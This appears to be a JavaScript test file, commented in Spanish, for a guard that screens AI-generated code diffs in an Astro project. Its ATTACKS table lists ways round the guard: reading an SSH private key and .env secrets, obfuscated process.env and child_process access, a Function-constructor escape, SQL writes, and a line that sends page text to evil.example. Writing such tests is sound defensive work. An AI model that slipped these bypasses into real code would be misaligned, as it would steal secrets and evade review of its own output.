import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { forbiddenPaths, importProblem, reviewAdded } from '../scripts/lib/guards.mjs';

const review = (file, text) => reviewAdded(new Map([[file, text]]));

// Las formas de saltarse la verja que encontró la auditoría, y alguna más.
const ATTACKS = {
	'fs sin node:': `import { readFileSync } from 'fs';\nreadFileSync('/root/.ssh/id_ed25519')`,
	'?raw del .env': `import raw from '../../.env?raw';`,
	'import.meta.glob': `const all = import.meta.glob('/**/*', { query: '?raw' });`,
	'process troceado': `const e = globalThis['pro' + 'cess']['e' + 'nv'];`,
	'desestructurar process': `const { env } = process;`,
	'constructor de función': `(() => {}).constructor('return this')();`,
	'import dinámico calculado': `const m = await import('child_' + 'process');`,
	'createRequire': `import { createRequire } from 'module';`,
	'INSERT OR REPLACE': `all("INSERT OR REPLACE INTO users VALUES (1)")`,
	'UPDATE con comillas': `run('UPDATE "users" SET login = 1')`,
	'navegar con datos': `location.href = 'https://evil.example/?c=' + document.body.innerText;`,
	'eval partido en líneas': `eval\n(code)`,
	'window.open': `window.open(url + data)`,
	'sesiones': `all('SELECT value FROM sessions')`,
	'tabla construida': `all('SELECT * FROM ' + tabla)`,
	'prerender': `export const prerender = true;`,
	'secretos por import': `import { read } from '../lib/env';`,
	'paquete cualquiera': `import x from 'left-pad';`,
	'sendBeacon': `navigator.sendBeacon('/x', data)`,
	'Reflect': `Reflect.get(obj, key)`,
	'escritura de la comunidad': `import { postChat } from '../lib/db/community';`,
};

describe('la verja del diff de la IA', () => {
	for (const [name, code] of Object.entries(ATTACKS)) {
		test(`para: ${name}`, () => {
			assert.notDeepEqual(review('src/components/X.astro', code), [], `pasó: ${code}`);
		});
	}

	test('deja pasar una página normal', () => {
		const page = [
			`import Layout from '../layouts/Layout.astro';`,
			`import Icon from '../components/Icon.astro';`,
			`import { getSessionUser } from '../lib/auth';`,
			`import { all } from '../lib/db/client';`,
			`import { getDashboardData } from '../lib/db/queries';`,
			`import { icons } from '@iconify-json/tabler';`,
			`const user = await getSessionUser(Astro);`,
			`const rows = all('SELECT login FROM users ORDER BY id LIMIT 10');`,
			`if (ok) location.href = '/ideas';`,
			`const res = await fetch('/api/consejos', { method: 'POST' });`,
			`el.textContent = data.title;`,
			`export const ALL = 'todas';`,
		].join('\n');
		assert.deepEqual(review('src/pages/nueva.astro', page), []);
	});

	test('las rutas: nada de endpoints ni ficheros ocultos', () => {
		assert.deepEqual(
			forbiddenPaths([
				'src/pages/estado.ts',
				'src/pages/x/y.js',
				'src/.gitignore',
				'src/lib/.oculto/a.ts',
				'src/pages/bien.astro',
				'src/lib/bien.ts',
				'public/bien.svg',
			]),
			['src/pages/estado.ts', 'src/pages/x/y.js', 'src/.gitignore', 'src/lib/.oculto/a.ts'],
		);
	});

	test('los imports relativos no salen de src/', () => {
		assert.match(importProblem('src/components/A.astro', '../../package.json'), /fuera de src/);
		assert.equal(importProblem('src/components/A.astro', '../lib/hora'), null);
	});
});

describe('lo que corre en el servidor', () => {
	test('fetch a una dirección calculada en el frontmatter se para; en el <script>, no', () => {
		const page = `---\nconst r = await fetch(destino);\n---\n<p>hola</p>`;
		assert.notDeepEqual(reviewAdded(new Map([['src/pages/a.astro', page]]), () => page), []);
		const client = `---\nconst t = 1;\n---\n<script>const b = await (await fetch(url)).blob();</script>`;
		assert.deepEqual(reviewAdded(new Map([['src/components/A.astro', client]]), () => client), []);
	});

	test('un módulo de src/lib que llama fuera se para', () => {
		assert.notDeepEqual(review('src/lib/x.ts', `export const f = (u) => fetch(u);`), []);
	});

	test('mencionar eval en un comentario no cuenta', () => {
		assert.deepEqual(review('src/lib/x.ts', `// aquí no hay eval ni new Function`), []);
	});
});
